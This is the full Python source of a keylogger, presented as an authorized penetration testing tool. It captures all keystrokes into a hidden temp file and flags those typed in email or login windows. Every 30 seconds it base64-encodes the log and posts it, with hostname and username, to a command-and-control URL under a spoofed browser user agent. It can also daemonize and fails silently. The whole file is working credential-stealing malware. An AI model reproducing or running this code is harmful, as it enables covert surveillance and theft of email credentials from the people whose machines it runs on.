#!/usr/bin/env python3
"""
Email Keylogger - Authorized Penetration Testing Tool
Captures keystrokes with context-aware email credential detection
GitHub: https://github.com/sheikh-coedextech/email-keylogger

Usage:
    python3 keylogger.py                    # Basic keylogger
    python3 keylogger.py --daemon           # Fork to background
    python3 keylogger.py --exfil http://c2  # Send to C2 server
"""

import os
import sys
import json
import time
import base64
import platform
import threading
import requests
import argparse
from datetime import datetime

try:
    from pynput.keyboard import Listener, Key
except ImportError:
    print("[-] Install requirements: pip install -r requirements.txt")
    sys.exit(1)

class EmailKeylogger:
    def __init__(self, exfil_url=None, log_file="/tmp/.ekl"):
        self.buffer = []
        self.exfil_url = exfil_url
        self.log_file = log_file
        self.running = True
        self.email_context = False
        self.last_send = time.time()
        
    def get_active_window(self):
        """Get active window title (cross-platform)"""
        system = platform.system()
        try:
            if system == "Linux":
                import subprocess
                result = subprocess.run(
                    ["xdotool", "getactivewindow", "getwindowname"],
                    capture_output=True, text=True, timeout=2
                )
                return result.stdout.strip()
            elif system == "Windows":
                import ctypes
                user32 = ctypes.windll.user32
                hwnd = user32.GetForegroundWindow()
                length = user32.GetWindowTextLengthW(hwnd)
                buf = ctypes.create_unicode_buffer(length + 1)
                user32.GetWindowTextW(hwnd, buf, length + 1)
                return buf.value
            elif system == "Darwin":
                import subprocess
                script = 'tell application "System Events" to get name of first process whose frontmost is true'
                result = subprocess.run(["osascript", "-e", script], capture_output=True, text=True, timeout=2)
                return result.stdout.strip()
        except:
            return "unknown"
        return "unknown"

    def is_email_page(self, title):
        """Detect email login contexts"""
        indicators = [
            'gmail', 'outlook', 'office365', 'exchange', 'webmail',
            'mail.', 'login', 'sign in', 'owa', 'zimbra',
            'roundcube', 'squirrelmail', 'email', 'correo',
            'thunderbird', 'evolution', 'mail.app'
        ]
        return any(ind in title.lower() for ind in indicators)

    def on_press(self, key):
        try:
            title = self.get_active_window()
            self.email_context = self.is_email_page(title)
            
            timestamp = datetime.now().strftime("%H:%M:%S")
            
            if hasattr(key, 'char') and key.char is not None:
                char = key.char
                self.buffer.append(char)
                
                # Log to file
                with open(self.log_file, "a") as f:
                    prefix = "[EMAIL] " if self.email_context else ""
                    f.write(f"{prefix}{char}")
                    
            elif key == Key.enter:
                line = ''.join(self.buffer[-50:])  # Last 50 chars
                with open(self.log_file + ".lines", "a") as f:
                    prefix = "[EMAIL] " if self.email_context else ""
                    f.write(f"{prefix}[{timestamp}] {line}\n")
                self.buffer = []
                
            elif key == Key.space:
                self.buffer.append(' ')
                with open(self.log_file, "a") as f:
                    f.write(' ')
                    
            elif key == Key.backspace:
                if self.buffer:
                    self.buffer.pop()
                with open(self.log_file, "a") as f:
                    f.write('[BS]')
                    
            elif key == Key.tab:
                self.buffer.append('\t')
                with open(self.log_file, "a") as f:
                    f.write('\t')
                    
            elif key == Key.esc:
                with open(self.log_file, "a") as f:
                    f.write('[ESC]')
                    
            # Auto-exfil every 30s if in email context
            if self.email_context and (time.time() - self.last_send) > 30:
                self.exfiltrate()
                
        except Exception as e:
            with open(self.log_file + ".err", "a") as f:
                f.write(f"Error: {e}\n")

    def exfiltrate(self):
        """Send captured data to C2"""
        if not self.exfil_url or not os.path.exists(self.log_file):
            return
            
        try:
            with open(self.log_file, "r") as f:
                data = f.read()
            
            email_lines = []
            if os.path.exists(self.log_file + ".lines"):
                with open(self.log_file + ".lines", "r") as f:
                    for line in f:
                        if "[EMAIL]" in line:
                            email_lines.append(line.strip())
            
            payload = {
                "hostname": platform.node(),
                "user": os.getenv("USER") or os.getenv("USERNAME"),
                "os": platform.system(),
                "keystrokes": base64.b64encode(data.encode()).decode(),
                "email_context_lines": email_lines,
                "timestamp": datetime.now().isoformat()
            }
            
            requests.post(
                self.exfil_url,
                json=payload,
                timeout=5,
                headers={"User-Agent": "Mozilla/5.0"}
            )
            self.last_send = time.time()
            
        except:
            pass  # Fail silently

    def start(self):
        print(f"[*] Keylogger started. PID: {os.getpid()}")
        print(f"[*] Log file: {self.log_file}")
        if self.exfil_url:
            print(f"[*] Exfiltrating to: {self.exfil_url}")
        print("[*] Email login pages will be flagged with [EMAIL] tag")
        
        with Listener(on_press=self.on_press) as listener:
            listener.join()

def daemonize():
    """Fork to background"""
    pid = os.fork()
    if pid > 0:
        sys.exit(0)
    os.setsid()
    os.umask(0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Email Keylogger - Authorized Testing Only")
    parser.add_argument("--daemon", action="store_true", help="Run in background")
    parser.add_argument("--exfil", type=str, help="C2 URL for exfiltration")
    parser.add_argument("--log", type=str, default="/tmp/.ekl", help="Log file path")
    args = parser.parse_args()
    
    if args.daemon:
        daemonize()
    
    kl = EmailKeylogger(exfil_url=args.exfil, log_file=args.log)
    
    try:
        kl.start()
    except KeyboardInterrupt:
        print("\n[*] Stopping keylogger...")
        sys.exit(0)